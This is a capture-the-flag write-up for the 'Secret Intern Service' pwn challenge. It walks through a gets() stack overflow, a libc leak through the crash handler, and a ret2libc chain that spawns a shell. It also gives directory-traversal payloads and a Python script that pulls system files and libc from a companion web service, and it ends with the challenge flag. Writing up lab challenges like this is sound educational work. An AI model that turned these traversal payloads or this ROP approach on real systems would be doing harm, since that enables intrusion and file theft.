# Secret Intern Service

**Point: 426**

Exploit the “unexploitable” service and prove you’re truly the best of the best.

This challenge depends on Secret File Viewer, find something useful for you right there

Author: Grissia

nc chal.thjcc.org 30001

## Summary

This challenge is a classic stack overflow with a helpful crash handler that leaks a libc address. The service restarts itself after a crash, which enables a two-stage exploit:

1. Trigger a crash to leak a libc function address.
2. Re-login and use the second overflow to run `system("/bin/sh")`.

The task depends on the "Secret File Viewer" service, which is vulnerable to directory traversal. That lets us download the target libc and compute exact offsets, making the ret2libc reliable.

## Files

- `chal.c` contains the vulnerable service.
- `debug.py` probes and confirms the crash behavior.
- `exploit.py` performs the full exploit (leak + ret2libc).
- `libc.so.6` is downloaded from the target via LFI in the Secret File Viewer.

## Vulnerability Analysis

The critical bug is `gets()` in `add_message()`:

```c
void add_message(int user_id){
    Message msg;
    msg.user_id = user_id;
    printf("Enter your message: ");
    getchar();
    gets(msg.content);
    printf("Message added for user %d: %s\n\n", msg.user_id, msg.content);
}
```

`msg.content` is 256 bytes, but `gets()` does not enforce a limit. The saved return address is reached at:

```
RIP_OFFSET = 256 (content) + 8 (saved RBP) = 264
```

When the function returns, the corrupted RIP crashes the program and triggers `crash_handler()`. That handler prints:

```
Disconnect handler: <address>
```

This is the current `puts()` address, which gives a libc leak.

## Secret File Viewer Dependency (LFI)

The "Secret File Viewer" runs on port `30000` and accepts:

```
/download.php?file=files/file_A.txt
```

Directory traversal is not properly filtered server-side. A working payload is:

```
download.php?file=../../../proc/self/maps
```

That reveals the exact libc path:

```
/usr/lib/x86_64-linux-gnu/libc.so.6
```

We can then download the libc:

```
download.php?file=../../../usr/lib/x86_64-linux-gnu/libc.so.6
```

## Exploitation Steps

1. Connect and log in to the service.
2. Send an overflow with a bad RIP to crash and leak `puts()`.
3. Compute libc base from the leaked `puts()` using the exact libc file.
4. Re-login after the crash handler restarts the service.
5. Send a ret2libc chain:
   - `ret` for alignment
   - `pop rdi; ret`
   - address of `"/bin/sh"`
   - address of `system`

## Commands Used

Download libc from the LFI service:

```python
import socket
host='chal.thjcc.org';port=30000
path='../../../usr/lib/x86_64-linux-gnu/libc.so.6'
req=f"GET /download.php?file={path} HTTP/1.1\r\nHost: chal.thjcc.org\r\nConnection: close\r\n\r\n".encode()
s=socket.socket();s.settimeout(5);s.connect((host,port))
s.sendall(req)
resp=b""
while True:
    chunk=s.recv(4096)
    if not chunk: break
    resp+=chunk
s.close()
_,_,body=resp.partition(b"\r\n\r\n")
open("libc.so.6","wb").write(body)
```

Run exploit:

```powershell
python exploit.py --libc libc.so.6
```

## Result

The exploit drops a shell and the flag is in `flag.txt`:

```
THJCC{w3_d13_1n_7h3_d4rk_50-y0u_m4y_l1v3_1n_7h3_l16h7}
```

## Notes

- The crash handler calls `main()` again, so the same connection can be reused after the crash.
- Using the exact target libc removes guesswork and makes the ROP chain reliable.
